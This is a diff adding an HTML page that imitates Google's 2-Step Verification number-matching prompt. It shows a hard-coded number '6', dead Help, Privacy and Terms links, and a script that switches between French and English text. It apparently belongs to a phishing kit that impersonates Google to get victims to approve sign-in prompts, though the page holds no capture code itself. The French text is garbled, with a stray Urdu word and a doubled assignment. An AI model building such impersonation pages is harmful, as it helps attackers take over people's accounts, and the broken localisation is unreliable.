@@ -1,0 +1,289 @@
+< !doctype html>
+    <html lang="en" id="html-tag">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="google" content="notranslate" />
+        <title>Google Accounts - 2-Step Verification</title>
+        <style>
+            * {
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+                font-family:
+                    -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+                    Arial, sans-serif;
+            }
+
+            body {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                background-color: #ffffff;
+                padding: 20px 16px;
+            }
+
+            .main-wrapper {
+                width: 100%;
+                max-width: 450px;
+            }
+
+            .login-card {
+                width: 100%;
+                background: #ffffff;
+                padding: 40px;
+                border: 1px solid #dadce0;
+                border-radius: 8px;
+                margin-bottom: 24px;
+                text-align: center;
+            }
+
+            .brand-logo {
+                font-size: 24px;
+                font-weight: 500;
+                margin-bottom: 20px;
+                letter-spacing: -0.5px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .brand-logo span:nth-child(1) {
+                color: #4285f4;
+            }
+
+            .brand-logo span:nth-child(2) {
+                color: #ea4335;
+            }
+
+            .brand-logo span:nth-child(3) {
+                color: #fbbc05;
+            }
+
+            .brand-logo span:nth-child(4) {
+                color: #4285f4;
+            }
+
+            .brand-logo span:nth-child(5) {
+                color: #34a853;
+            }
+
+            .brand-logo span:nth-child(6) {
+                color: #ea4335;
+            }
+
+            h1 {
+                font-size: 24px;
+                font-weight: 400;
+                color: #202124;
+                margin-bottom: 16px;
+            }
+
+            .phone-prompt-icon {
+                width: 60px;
+                height: 90px;
+                border: 3px solid #bcc1c6;
+                border-radius: 8px;
+                margin: 24px auto;
+                position: relative;
+                background: #f8f9fa;
+            }
+
+            .phone-prompt-icon::before {
+                content: "";
+                position: absolute;
+                top: 6px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 12px;
+                height: 3px;
+                background: #bcc1c6;
+                border-radius: 2px;
+            }
+
+            .phone-prompt-icon::after {
+                content: "";
+                position: absolute;
+                top: 25px;
+                left: 5px;
+                right: 5px;
+                height: 35px;
+                background: #e8f0fe;
+                border: 1px solid #4285f4;
+                border-radius: 4px;
+            }
+
+            .matching-number {
+                font-size: 48px;
+                font-weight: 400;
+                color: #202124;
+                margin: 24px 0;
+            }
+
+            .instruction-text {
+                font-size: 14px;
+                color: #3c4043;
+                line-height: 1.5;
+                text-align: left;
+                margin-bottom: 16px;
+            }
+
+            .link-blue {
+                color: #1a73e8;
+                font-size: 14px;
+                font-weight: 500;
+                text-decoration: none;
+                display: inline-block;
+                cursor: pointer;
+                text-align: left;
+                width: 100%;
+                margin-top: 20px;
+            }
+
+            .link-blue:hover {
+                text-decoration: underline;
+            }
+
+            .footer-row {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 0 4px;
+                font-size: 12px;
+                color: #5f6368;
+                width: 100%;
+            }
+
+            .footer-links a {
+                color: #5f6368;
+                text-decoration: none;
+                margin-left: 16px;
+            }
+
+            .footer-links a:hover {
+                color: #202124;
+            }
+
+            .lang-selector {
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+            }
+
+            .lang-selector::after {
+                content: " ▼";
+                font-size: 8px;
+                margin-left: 4px;
+            }
+
+            @media (max-width: 480px) {
+                body {
+                    justify-content: flex-start;
+                    padding-top: 10px;
+                }
+
+                .login-card {
+                    border: none;
+                    padding: 20px 8px;
+                }
+
+                .footer-row {
+                    flex-direction: column;
+                    gap: 16px;
+                    align-items: flex-start;
+                    padding-left: 8px;
+                }
+
+                .footer-links {
+                    display: flex;
+                    width: 100%;
+                    justify-content: flex-start;
+                }
+
+                .footer-links a {
+                    margin-left: 0;
+                    margin-right: 16px;
+                }
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="main-wrapper">
+            <div class="login-card">
+                <div class="brand-logo" translate="no">
+                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                </div>
+
+                <h1 id="text-title">2-Step Verification</h1>
+
+                <div id="text-sub" class="instruction-text"
+                    style="font-size: 16px; color: #202124; margin-bottom: 20px">
+                    Google sent a notification to your phone. Tap Yes, then tap the number
+                    below to sign in.
+                </div>
+
+                <div class="phone-prompt-icon"></div>
+
+                <div class="matching-number">6</div>
+
+                <div id="text-device" class="instruction-text" style="color: #5f6368">
+                    Your phone or tablet (Session info)
+                </div>
+
+                <a href="#" id="text-resend" class="link-blue">Resend notification</a>
+            </div>
+
+            <div class="footer-row">
+                <div id="text-lang" class="lang-selector">English (United States)</div>
+                <div class="footer-links">
+                    <a href="#" id="text-help">Help</a>
+                    <a href="#" id="text-privacy">Privacy</a>
+                    <a href="#" id="text-terms">Terms</a>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            const userLanguage = navigator.language || navigator.userLanguage;
+
+            if (userLanguage.startsWith("fr")) {
+                document.getElementById("html-tag").setAttribute("lang", "fr");
+
+                document.getElementById("text-title").innerText =
+                    "Validation en deux étapes";
+                document.getElementById("text-sub").innerText = document.getElementById(
+                    "text-sub",
+                ).innerText =
+                    "Google نے envoyé une notification à votre téléphone. Appuyez sur Oui, puis sur le numéro ci-dessous pour vous connecter.";
+                document.getElementById("text-device").innerText =
+                    "Votre téléphone ou tablette (Infos sur la session : À proximité)";
+                document.getElementById("text-resend").innerText =
+                    "Renvoyer la notification";
+                document.getElementById("text-lang").innerText = "Français (France)";
+                document.getElementById("text-help").innerText = "Aide";
+                document.getElementById("text-privacy").innerText = "Confidentialité";
+                document.getElementById("text-terms").innerText = "Conditions";
+            } else {
+                document.getElementById("html-tag").setAttribute("lang", "en");
+
+                document.getElementById("text-title").innerText = "2-Step Verification";
+                document.getElementById("text-sub").innerText =
+                    "Google sent a notification to your phone. Tap Yes, then tap the number below to sign in.";
+                document.getElementById("text-device").innerText =
+                    "Your phone or tablet (Session info: Nearby)";
+                document.getElementById("text-resend").innerText =
+                    "Resend notification";
+                document.getElementById("text-lang").innerText =
+                    "English (United States)";
+                document.getElementById("text-help").innerText = "Help";
+                document.getElementById("text-privacy").innerText = "Privacy";
+                document.getElementById("text-terms").innerText = "Terms";
+            }
+        </script>
+    </body>
+
+    </html>
